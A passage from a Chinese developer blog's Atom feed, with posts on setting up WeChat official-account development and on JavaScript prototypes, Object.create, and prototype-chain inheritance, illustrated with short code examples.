title="首页=&gt;开发=&gt;基本配置"></a>首页=&gt;开发=&gt;基本配置</h5><h6 id="公众号开发信息"><a href="#公众号开发信息" class="headerlink" title="公众号开发信息"></a>公众号开发信息</h6><p>AppId用在很多地方</p><p>AppSecret只能放在服务端，前端代码对攻击者来说完全是透明的，只要是跟AppSecret相关的接口都一定是后端调微信的接口。</p><p>需要添加你的IP在Ip白名单里，这样才可以获取acces_token来测试</p><h6 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h6><p>不要配置这个，以免运营妹子的自动回复没了</p><h6 id="已绑定的微信开放平台帐号"><a href="#已绑定的微信开放平台帐号" class="headerlink" title="已绑定的微信开放平台帐号"></a>已绑定的微信开放平台帐号</h6><p>有用到unionId的话会需要这部分</p><h5 id="首页-gt-开发-gt-开发者工具"><a href="#首页-gt-开发-gt-开发者工具" class="headerlink" title="首页=&gt;开发=&gt;开发者工具"></a>首页=&gt;开发=&gt;开发者工具</h5><p><img src="/images/微信公众平台-开发者工具.png" alt=""></p><p>下载一个微信开发者工具</p><p>开发者工具相关信息：<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1455784140" target="_blank" rel="noopener">https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1455784140</a></p><p>关注公众平台安全助手</p><p>让管理者开通公号开发者权限</p><p>基本工作完成就可以用开发者工具调试公号页面啦</p><h4 id="完成需求的步骤"><a href="#完成需求的步骤" class="headerlink" title="完成需求的步骤"></a>完成需求的步骤</h4><p>1.当PM抛出一个需求时，我们应该看看<strong>当前的公众号是否有相应的权限</strong>。</p><p>不要设计接口、讨论开发了半天才发现这个公号根本没有这个接口权限。</p><p>登录微信公众平台=&gt;开发=&gt;接口权限</p><p>或者综合的接口权限说明： <a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1433401084" target="_blank" rel="noopener">https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1433401084</a></p><p>选择设置=&gt;系统代理时，fiddler代理并不能生效。可以选择手动设置代理，ipconfig获取本机ip，ip:8888。</p><h5 id="订阅号和服务号的区别："><a href="#订阅号和服务号的区别：" class="headerlink" title="订阅号和服务号的区别："></a>订阅号和服务号的区别：</h5><p>简言之，订阅号会被收纳起来，服务号推送消息会直接出现的你的消息列表中</p><p>订阅号比如：咪蒙。。。这类写文章的。</p><p>服务号比如：小米商城，招行信用卡，京医通等等。</p><p>其他的区别参见：<br><a href="https://www.zhihu.com/question/21289814" target="_blank" rel="noopener">https://www.zhihu.com/question/21289814</a></p><p>2.思索一下在生活中有没有看到过类似的别人完成的需求。</p><p>PM也是人，他们设计肯定也是看别人发了啥他们也要，他见过的咱们也肯定见过啊，没有见过就让他给找例子。</p><p>3.在chrome中打开链接，F12看下源码</p><p>反正咱们前端都是小透明，如果运气好没压缩的话，很easy就可以看懂了。</p><p>其实最大的问题是刚开始因为刚上手，不太明确前端和后端的职责，看看别人页面的network就可以胸有成竹的指使后端我需要这个你得给我返回啦~</p><p>有套路，不迷路。</p><h4 id="经常需要查看的文档们，google不如看文档："><a href="#经常需要查看的文档们，google不如看文档：" class="headerlink" title="经常需要查看的文档们，google不如看文档："></a>经常需要查看的文档们，google不如看文档：</h4><p>公众平台综合技术文档：<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1472017492_58YV5" target="_blank" rel="noopener">https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1472017492_58YV5</a></p><p>JS-SDK：<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421141115" target="_blank" rel="noopener">https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421141115</a></p><p>JS接口签名校验工具：<a href="https://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=jsapisign&amp;token=&amp;lang=zh_CN" target="_blank" rel="noopener">https://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=jsapisign&amp;token=⟨=zh_CN</a></p><p>接口调试工具：<a href="https://mp.weixin.qq.com/debug?token=1156200581&amp;lang=zh_CN" target="_blank" rel="noopener">https://mp.weixin.qq.com/debug?token=1156200581⟨=zh_CN</a></p><p>获取JSTicket：<a href="https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token={Access_TOKEN}&amp;type=jsapi" target="_blank" rel="noopener">https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token={Access_TOKEN}&amp;type=jsapi</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;现在经济不景气，小公司拿不到投资，连iOS开发和andriod开发都招不起，而微信凭借着众多的用户，成为了开发的热土，一个创业公司可以没有App，但一定会需要先在微信里试水，是公司获客的最佳渠道。&lt;/p&gt;
&lt;p&gt;这个系列记录了微信开发遇到的问题，和产品狗相爱相杀的往事。&lt;/p&gt;
    
    </summary>
    
    
      <category term="微信开发" scheme="https://evacoder.com/tags/%E5%BE%AE%E4%BF%A1%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>JS中的面向对象5-Object.create和new Object</title>
    <link href="https://evacoder.com/2018/07/18/jsoo_object_create/"/>
    <id>https://evacoder.com/2018/07/18/jsoo_object_create/</id>
    <published>2018-07-18T06:02:40.000Z</published>
    <updated>2019-03-13T12:08:12.577Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Person = <span class="function"><span class="keyword">function</span>(<span class="params">age</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.age=age;</span><br><span class="line">    <span class="keyword">this</span>.say=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="string">'hello'</span>);&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> p=<span class="keyword">new</span> Person(<span class="number">11</span>);</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="built_in">Object</span>.create(p);</span><br></pre></td></tr></table></figure><p><img src="/images/proto1.png" alt=""></p><p><img src="/images/proto2.png" alt=""></p><p>从console中可以发现，p成了p1的原型对象，p中的属性和方法都成了p1的原型方法。</p><p>Object.create的作用就是传入一个对象，给创建的新对象提供<code>__proto__</code>引用</p><p>多用在对象的继承中。</p><p>Object.create的实现方式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">Object</span>.create) &#123;</span><br><span class="line">  <span class="built_in">Object</span>.create = <span class="function"><span class="keyword">function</span>(<span class="params">proto, propertiesObject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> proto !== <span class="string">'object'</span> &amp;&amp; <span class="keyword">typeof</span> proto !== <span class="string">'function'</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'Object prototype may only be an Object:'</span> + proto);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (proto === <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"This browser's implementation of Object.create is a shim and doesn't support 'null'"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> propertiesObject != <span class="string">'undefined'</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"This browser's implementation of Object.create is a shim and doesn't support a second argument"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">    F.prototype = proto;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> F();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/create" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/create</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l
      
    
    </summary>
    
    
      <category term="javascript" scheme="https://evacoder.com/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>JS中的面向对象4-继承的实现</title>
    <link href="https://evacoder.com/2018/07/15/jsoo_inherit/"/>
    <id>https://evacoder.com/2018/07/15/jsoo_inherit/</id>
    <published>2018-07-15T05:05:02.000Z</published>
    <updated>2019-02-14T09:20:15.420Z</updated>
    
    <content type="html"><![CDATA[<p>理解了基本发展历史和深层原理，接下来就是生生不息的原因，继承部分啦。<br><a id="more"></a></p><p>我们知道JS是单继承的，Object.prototype是原型链的顶端，所有对象从它继承了包括toString等方法和属性。</p><p>Object本身是类当然也是构造函数，构造函数嘛当然是继承自Function.prototype</p><p>而Function也是对象，继承自Object.prototype。</p><p>这里就有一个鸡和蛋的问题：到底是先有Object还是先有Function。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span> <span class="keyword">instanceof</span> <span class="built_in">Function</span> <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Function</span> <span class="keyword">instanceof</span> <span class="built_in">Object</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Function</span>.prototype===<span class="built_in">Function</span>.__proto__ <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.__proto__ === <span class="literal">null</span> <span class="comment">// true 说明原型链到Object.prototype终止。</span></span><br></pre></td></tr></table></figure><p>上篇中我们了解到原型链是实现继承的主要方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.property = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">SuperType.prototype = &#123;</span><br><span class="line">  <span class="keyword">constructor</span>: SubType,</span><br><span class="line">  getSuperVal: function() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.property;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.subProperty = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">SubType.prototype = <span class="keyword">new</span> SuperType(); <span class="comment">// 重点</span></span><br><span class="line">SubType.property.getSubVal = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.subProperty;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sub1 = <span class="keyword">new</span> SubType();</span><br><span class="line">sub1.getSuperVal(); <span class="comment">// true</span></span><br><span class="line">sub1.getSubVal(); <span class="comment">// false</span></span><br><span class="line">sub1 <span class="keyword">instanceof</span> SubType; <span class="comment">// true</span></span><br><span class="line">sub1 <span class="keyword">instanceof</span> SuperType; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>回顾下new的作用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> instance=<span class="keyword">new</span> Person();</span><br><span class="line"><span class="comment">// 实际经历了如下四步：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.创建空对象</span></span><br><span class="line"><span class="keyword">var</span> instance = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.设置原型链，指向类【构造函数】的原型</span></span><br><span class="line">instance.__proto__ = Person.prototype;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.让构造函数Person的this指向实例instance,执行构造函数Person的函数体</span></span><br><span class="line"><span class="keyword">var</span> p = Person.call(instance);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.判断Person的返回值类型</span></span><br><span class="line"><span class="comment">// 值类型就不要了，还是返回instance</span></span><br><span class="line"><span class="comment">// 如果是引用类型，替换掉instance返回引用类型</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> p ==<span class="string">'object'</span>)&#123;</span><br><span class="line"> <span class="keyword">return</span> p </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以上文中重点new实现了如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SubType.prototype.__proto__ = SuperType.prototype;</span><br><span class="line">SuperType.call(SubType.prototype);</span><br><span class="line"><span class="keyword">var</span> Animal = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.wow = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name + <span class="string">':wow'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Dog = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.run = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name + <span class="string">':run'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Dog.prototype = <span class="keyword">new</span> Animal(); <span class="comment">// 继承的实现：将父类原型指向子类</span></span><br><span class="line">Dog.prototype=Animal.prototype; <span class="comment">// 为啥不是这样？</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;理解了基本发展历史和深层原理，接下来就是生生不息的原因，继承部分啦。&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="https://evacoder.com/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>JS中的面向对象3-原型和构造函数的关系</title>
    <link href="https://evacoder.com/2018/06/30/jsoo_prototype_constructor/"/>
    <id>https://evacoder.com/2018/06/30/jsoo_prototype_constructor/</id>
    <published>2018-06-30T10:02:09.000Z</published>
    <updated>2019-03-13T12:10:39.388Z</updated>
    
    <content type="html"><![CDATA[<p>本系列是学习整理js中的面向对象的第3篇，原型和构造函数的关系，接下来就要更深入的探究其中的原理了。<br><a id="more"></a></p><h4 id="原型和构造函数到底有什么关系？"><a href="#原型和构造函数到底有什么关系？" class="headerlink" title="原型和构造函数到底有什么关系？"></a>原型和构造函数到底有什么关系？</h4><p><img src="/images/proto3.png" alt=""></p><p>构造函数有原型对象，Person.prototype，此对象中有属性constructor，指向了构造函数Person，构造函数又有原型…</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Person.prototype.constructor===Person;<span class="comment">//true</span></span><br><span class="line">Person.prototype.constructor.prototype.constructor.prototype===Person.prototype; <span class="comment">// true 两者相依相存</span></span><br></pre></td></tr></table></figure><p>构造函数是为了方便创建对象。</p><p>构造函数通过prototype来存储要共享的属性和方法。</p><h4 id="prototype和-proto-（-Prototype-）又有什么关系？"><a href="#prototype和-proto-（-Prototype-）又有什么关系？" class="headerlink" title="prototype和__proto__（[[Prototype]]）又有什么关系？"></a>prototype和__proto__（[[Prototype]]）又有什么关系？</h4><p><strong>类和构造函数</strong>：比如Array你可以看做一个类，也可以看成是Array的构造函数。</p><p><code>__proto__</code>:是<strong>实例</strong>的属性，指向构造函数的原型 constructor.prototype，每个对象都有。所以我们暂且称它为原型引用。</p><p><code>prototype</code>:原型对象，只有函数才有prototype，所以<strong>原型是构造函数（类）的原型</strong>。</p><p>我们先来回忆下new操作符到底做了什么【参见js中的面向对象2】。</p><p>就是new操作符实现了实例的<code>__proto__</code>指向类的原型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// __proto__是new出来的实例内部包含的一个指针，指向constructor.prototype。每个对象都有</span></span><br><span class="line">p.__proto__ === Person.prototype <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">p.prototype <span class="comment">// undefined 只有函数才有prototype</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.getPrototypeOf(p)=== p.__proto__===Person.prototype <span class="comment">// Object.getPrototypeOf得到实例的__proto__</span></span><br><span class="line"><span class="comment">// 字面意思是获取实例的原型prototype，实际是获取原型的引用。</span></span><br><span class="line"><span class="comment">// 因为实例没有原型，只有原型引用__proto__，类（构造函数）才有原型prototype</span></span><br><span class="line"></span><br><span class="line">Person.prototype.isPrototypeOf(p) <span class="comment">// true isPrototypeOf 原型对象是构造函数的原型</span></span><br></pre></td></tr></table></figure><h4 id="prototype和实例又有什么关系呢？"><a href="#prototype和实例又有什么关系呢？" class="headerlink" title="prototype和实例又有什么关系呢？"></a>prototype和实例又有什么关系呢？</h4><p>prototype是用来保存类的公共属性和方法的，其实也是个特殊的对象，可以理解为和实例是一个level的。但是他们之间有什么关系和区别呢</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 联系</span></span><br><span class="line">p.constructor === Person.prototype.constructor === Person; <span class="comment">// true 两者具有相同的构造函数</span></span><br><span class="line"></span><br><span class="line">p.__proto__ === Person.prototype; <span class="comment">// true 实例的原型引用指向了原型对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 区别</span></span><br><span class="line">Person.prototype.__proto__===Person.prototype; <span class="comment">// flase 原型的原型引用不再是原型对象啦</span></span><br></pre></td></tr></table></figure><p>既然是一个level为啥不相等呢？因为原型肩负了继承的重要责任。</p><p>正是通过<code>Person.prototype.__proto__.__proto__.__proto__.__proto__.__proto__</code>来一层层向上查找父类，这就是所谓的<strong>原型链</strong></p><p>所以继承的写法就是</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person.prototype=<span class="keyword">new</span> Parent();</span><br></pre></td></tr></table></figure><p>结合前面new的作用，可以明白此处实际上的最重要的作用就是</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Person.prototype.__proto__=Parent.prototype;<span class="comment">// 将原型引用指向父类的原型</span></span><br><span class="line"><span class="comment">// Person.__proto__总是指向父类</span></span><br></pre></td></tr></table></figure><p>调用p.name时，会从p自身的属性中寻找是否有name，没有则到p对应的原型中寻找<br><code>obj.__proto__.__proto__.__proto__</code>形成原型链，可以通过instanceof来验证obj是否是构造函数（类）的实例</p><p>继承的细节将在下节来详细解释</p><h4 id="Object和Function的关系及特殊的原型对象"><a href="#Object和Function的关系及特殊的原型对象" class="headerlink" title="Object和Function的关系及特殊的原型对象"></a>Object和Function的关系及特殊的原型对象</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1= &#123;<span class="attr">x</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj2= <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">obj1.__proto__ === <span class="built_in">Object</span>.prototype <span class="comment">// true 指向构造函数的原型</span></span><br><span class="line">obj2.__proto__ === <span class="built_in">Object</span>.prototype <span class="comment">// true</span></span><br><span class="line">obj1.toString === <span class="built_in">Object</span>.prototype.toString === obj2.__proto__.toString <span class="comment">// true 调用实例方法实际上是调用原型的方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn1=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> fn2=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line">fn1.constructor===<span class="built_in">Function</span></span><br><span class="line">fn1.__proto__===<span class="built_in">Function</span>.prototype </span><br><span class="line">fn1__proto__===fn2.__proto__ <span class="comment">// true </span></span><br><span class="line"></span><br><span class="line">fn1.prototype.constructor=fn1;</span><br><span class="line">fn1.prototype.constructor.name <span class="comment">// fn1</span></span><br><span class="line">fn2.prototype.constructor.name <span class="comment">// fn2</span></span><br><span class="line">fn1.prototype===fn2.prototype <span class="comment">// false </span></span><br><span class="line">fn1.prototype===&#123;</span><br><span class="line">    <span class="comment">// fn1</span></span><br><span class="line">    <span class="keyword">constructor</span>:function()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">// 指向了Object.prototype</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn1.prototype.__proto__ === <span class="built_in">Object</span>.prototype</span><br><span class="line"><span class="comment">// 所以Function 继承自Object</span></span><br></pre></td></tr></table></figure><h4 id="原型的相关方法"><a href="#原型的相关方法" class="headerlink" title="原型的相关方法"></a>原型的相关方法</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.getPrototypeOf(p) === Person.prototype; <span class="comment">// true</span></span><br><span class="line">Person.prototype.isPrototypeOf(p); <span class="comment">// true</span></span><br><span class="line">p.hasOwnProperty(<span class="string">'name'</span>); <span class="comment">// false 是原型属性</span></span><br><span class="line">p.salary = <span class="number">25000</span>;</span><br><span class="line">p.hasOwnProperty(<span class="string">'salary'</span>); <span class="comment">// true 是实例属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过in操作符和hasOwnProperty可以判断属性到底是在实例还是原型中</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasPrototypeProperty</span>(<span class="params">obj, name</span>) </span>&#123; <span class="comment">// 判断是否是原型属性</span></span><br><span class="line">  <span class="keyword">return</span> !obj.hasOwnProperty(name) &amp;&amp; (name <span class="keyword">in</span> obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 因为in操作符包括原型属性，所以在遍历时eslint不建议使用for-in，如果必须使用也需要用hasOwnProperty来过滤下</span></span><br><span class="line"></span><br><span class="line">p <span class="keyword">instanceof</span> Person; <span class="comment">// true 实例是否是类的实例</span></span><br></pre></td></tr></table></figure><h4 id="基本类型判断"><a href="#基本类型判断" class="headerlink" title="基本类型判断"></a>基本类型判断</h4><p>但是instanceof也有力不从心的时候，回忆下我们判断isArray，isDate等类型的方法，instanceof假定只有一个全局作用域，在页面中有多个frame时，存在两个以上的全局执行环境，一个框架向另一个框架传值时，会有不一样的构造函数。建议使用以下方式来判断。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isType</span>(<span class="params">type</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">obj</span> =&gt;</span> <span class="built_in">Object</span>.prototype.toString.call(obj) === <span class="string">`[object <span class="subst">$&#123;type&#125;</span>]`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isObject = isType(<span class="string">'Object'</span>);</span><br><span class="line"><span class="keyword">const</span> isString = isType(<span class="string">'String'</span>);</span><br><span class="line"><span class="keyword">const</span> isArray = <span class="built_in">Array</span>.isArray || isType(<span class="string">'Array'</span>);</span><br><span class="line"><span class="keyword">const</span> isFunction = isType(<span class="string">'Function'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; isObject, isString, isArray, isFunction &#125;;</span><br><span class="line"><span class="comment">// toString只能通过Object.prototype.toString.call来调用才能判断类型</span></span><br></pre></td></tr></table></figure><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">age, name, friends</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.friends = friends;</span><br><span class="line">  <span class="comment">// 只在初始化时判断，不需要把每个方法都判断TODO</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span>.sayName != <span class="string">'function'</span>) &#123;</span><br><span class="line">    Person.prototype.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 局部添加方法和属性会立即生效，重写整个原型对象会切断现有实例和原型的关系</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在已经创建实例的情况下，使用Person.prototype=&#123;&#125;这种对象字面量，相当于重写原型</span></span><br><span class="line">    <span class="comment">// 会切断现有实例和原型之间的关联</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考<br><a href="https://github.com/creeperyang/blog/issues/9" target="_blank" rel="noopener">https://github.com/creeperyang/blog/issues/9</a><br><a href="https://www.zhihu.com/question/34183746" target="_blank" rel="noopener">https://www.zhihu.com/question/34183746</a></p>]]></content>
    
    <summary type="html">
    
